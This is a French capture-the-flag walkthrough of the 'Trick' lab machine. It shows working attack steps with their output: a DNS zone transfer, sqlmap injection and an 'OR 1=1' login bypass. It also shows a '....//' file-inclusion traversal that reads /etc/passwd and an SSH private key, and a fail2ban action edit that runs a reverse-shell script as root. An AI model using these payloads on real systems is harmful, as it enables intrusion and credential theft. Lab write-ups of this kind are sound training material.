# Trick - Easy

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-26 17:36 EST
Nmap scan report for 10.10.11.166
Host is up (0.025s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 61:ff:29:3b:36:bd:9d:ac:fb:de:1f:56:88:4c:ae:2d (RSA)
|   256 9e:cd:f2:40:61:96:ea:21:a6:ce:26:02:af:75:9a:78 (ECDSA)
|_  256 72:93:f9:11:58:de:34:ad:12:b5:4b:4a:73:64:b9:70 (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Coming Soon - Start Bootstrap Theme
|_http-server-header: nginx/1.14.2
Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On va d’abord tester le site.

Le site est codé en C, il y a bootstrap, c’est juste une page pour dire que le site arrive bientôt, avec une newsletter. Le site est donc pas fonctionnel et il n’y a rien d’intéressant dans le code source.

On va lancer un gobuster en tâche de fond. Rien de trouvé au final et rien sur le site.

Au passage, on remarque que le smtp n’est pas en open relay grâce au script nmap:

```bash
nmap -p25 --script smtp-open-relay 10.10.11.166
smtp-open-relay: Server doesn't seem to be an open relay, all tests failed
```

Dans le DNS lookup on trouve le nom de domaine en faisant un reverse lookup, on demande au serveur quel est le nom de domaine derrière lui même

```bash
nslookup 
server 10.10.11.166
10.10.11.166
;; communications error to 10.10.11.166#53: timed out
166.11.10.10.in-addr.arpa       name = trick.htb.
```

Si on suit les pentest de ce guide:

On tombe sur les zone transfer:

```bash
dig axfr @10.10.11.166 trick.htb

; <<>> DiG 9.18.8-1~bpo11+1-Debian <<>> axfr @10.10.11.166 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 89 msec
;; SERVER: 10.10.11.166#53(10.10.11.166) (TCP)
;; WHEN: Thu Jan 26 18:08:24 EST 2023
;; XFR size: 6 records (messages 1, bytes 231)
```

Ceci nous donne deux sous domaines: root.trick.htb et preprod-payroll.trick.htb, on le rajoute au /etc/hosts. Sur le navigateur on tombe alors sur un panel admin.

On relance un gobuster même si ce sera sûrement une injection. On va essayer avec SQLMap en analysant la requête avec BurpSuite.

On trouve la page users.php qui contient juste l’information que Enemigosss est un admin.

Dans employee.php: 

```bash
Employee No 	Firstname 	Middlename 	Lastname 	Department 	Position 	Action
2020-9838 	John 	C 	Smith 	IT Department 	Programmer
```

Vu qu’il n’y a rien de particulier on va intercepter une requête avec burp et l’utiliser avec SQLMap

```bash
sqlmap -r login.req

[18:24:23] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
```

On va alors essayer quelques injections basique mysql, les commentaires sont:

```bash
-- -
```

On essaye donc avec

```bash
admin' OR 1=1 -- -
```

On est connecté sur le panel, ça a fonctionné.

On dirait qu’il y a une LFI dans l’URL:

```bash
http://preprod-payroll.trick.htb/index.php?page=department
```

On va tenter d’accéder à des pages:

```bash
http://preprod-payroll.trick.htb/index.php?page=login
```

La page de login s’incruste dans la page actuelle, c’est bon signe alors on essaye de récupérer les pages qu’on a trouvé avec gobuster dir mais innacessible c’est à dire:

```bash
ajax.php
db_connect.php
```

On n’arrive pas à y accéder en direct alors on essaye avec burp. Rien non plus.

On essaye quand même de récupérer des infos avec cette injection puisque l’on a pas réussi à lire les fichiers:

```bash
sqlmap -r login.req --current-user
remo@localhost
sqlmap -r login.req --is-dba
current user is DBA: False
sqlmap -r login.req --passwords
[ERROR] unable to retrieve the password hashes for the database users
sqlmap -r login.req --all
[INFO] retrieved: FILE
database management system users privileges:
[*] %remo% [1]:
    privilege: FILE
```

On a le privilège de consulter des fichiers donc on va essayer d’extraire /etc/passwd par exemple:

```bash
sqlmap -r login.req --file-read /etc/passwd --batch --level 5 --risk 3 --technique BEU
```

Les risques et la technique sont là pour accélérer le processus sinon c’est très lent

On sait que le serveur tourne sous nginx, la localisation par défaut du fichier de config est /etc/nginx/nginx.conf

```bash
sqlmap -r login.req --file-read /etc/nginx/nginx.conf --batch --level 5 --risk 3 --technique BEU
```

Le fichier contient cette section:

```bash
include /etc/nginx/conf.d/*.conf;
include /etc/nginx/sites-enabled/*;
```

On essaye donc de récupérer dans le include:

```bash
sqlmap -r login.req --file-read /etc/nginx/sites-enabled/* --batch --level 5 --risk 3 --technique BEU
```

Et le fichier récupéré contient ceci en plus des deux serveurs déjà connus:

```bash
server {
        listen 80;
        listen [::]:80;

        server_name preprod-marketing.trick.htb;

        root /var/www/market;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

On tombe alors sur un nouveau site en construction. Il semble qu’il y a encore une LFI mais on remarque que cette fois-ci il y a l’extension:

```bash
http://preprod-marketing.trick.htb/index.php?page=services.html
```

Pas réussi à rech un autre directory (payroll par ex) donc on va directement télécharger le fichier du code de la page avec sqlmap pour comprendre s’il y a vraiment une inclusion. Voici le code de la page:

```php
<?php
$file = $_GET['page'];

if(!isset($file) || ($file=="index.php")) {
   include("/var/www/market/home.html");
}
else{
        include("/var/www/market/".str_replace("../","",$file));
}
?>
```

On voit que le ../ est remplacé par le vide alors on peut utiliser un autre symbole pour revenir en arriève: //

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
```

On note que l’on ne peut toujours pas accéder aux fichiers cachés de /var/www/payroll.

On sait grâce au /etc/passwd que il y a seulement root et micheal en vrai utilisateurs donc on essaye de récupérer le flag dans le home de micheal et ça marche donc on est bien sur son compte.

Ensuite on peut récupérer ceci:

```bash
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//home/michael/.ssh/id_rsa
```

Donc on a carrément la clé de micheal pour se logger en ssh. On la copie dans un fichier pour l’utiliser.

```bash
chmod 600 michael.creds
ssh michael@10.10.11.166 -i michael.creds
```

On a un foothold !

Réflexe:

```bash
sudo -l

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
```

On va donc inspecter cet executable

```bash
fail2ban est une application qui analyse les logs de divers services (SSH, Apache, FTP…) en cherchant des correspondances entre des motifs définis dans ses filtres et les entrées des logs. Lorsqu'une correspondance est trouvée une ou plusieurs actions sont exécutées. Typiquement, fail2ban cherche des tentatives répétées de connexions infructueuses dans les fichiers journaux et procède à un bannissement en ajoutant une règle au pare-feu iptables ou nftables pour bannir l'adresse IP de la source.

Il est vivement déconseillé de modifier les fichiers de configuration /etc/fail2ban/fail2ban.conf et /etc/fail2ban/jail.conf (notamment car ils peuvent être écrasés par une mise à jour). Ces fichiers contiennent les configurations de base qu'on peut surcharger au moyen d'un ou plusieurs fichiers enregistrés dans /etc/fail2ban/jail.d
Le fichier /etc/fail2ban/jail.conf doit servir uniquement de référence et de documentation.
```

Dans jail.conf

```bash
#
# Action shortcuts. To be used to define action parameter

# Default banning action (e.g. iptables, iptables-new,
# iptables-multiport, shorewall, etc) It is used to define
# action_* variables. Can be overridden globally or per
# section within jail.local file
banaction = iptables-multiport
banaction_allports = iptables-allports
```

Or Michael est du groupe:

```bash
groups
michael security
```

Ce qui nous permet d’écrire dans:

```bash
269281 drwxrwx---   2 root security  4096 Jan 31 17:39 action.d
```

Ce dossier contient les actions, on va donc créer nos propres actions 

On va donc modifier actionban pour lancer un shell vers notre machine

```bash
mv iptables-multiport.conf iptables-multiport.conf.bak
cp iptables-multiport.conf.bak iptables-multiport.conf
vi /tmp/shell.sh
chmod +x /tmp/shell.sh
```

et on modifie:

```bash
actionban = /tmp/shell.sh
```

On redémarre:

```bash
sudo /etc/init.d/fail2ban restart
```

Il suffit de spammer les connection SSH et avec un peu chance ça marche du premier coup, sinon il faut ressayer en refaisant toute la procédure. On obtient le flag root.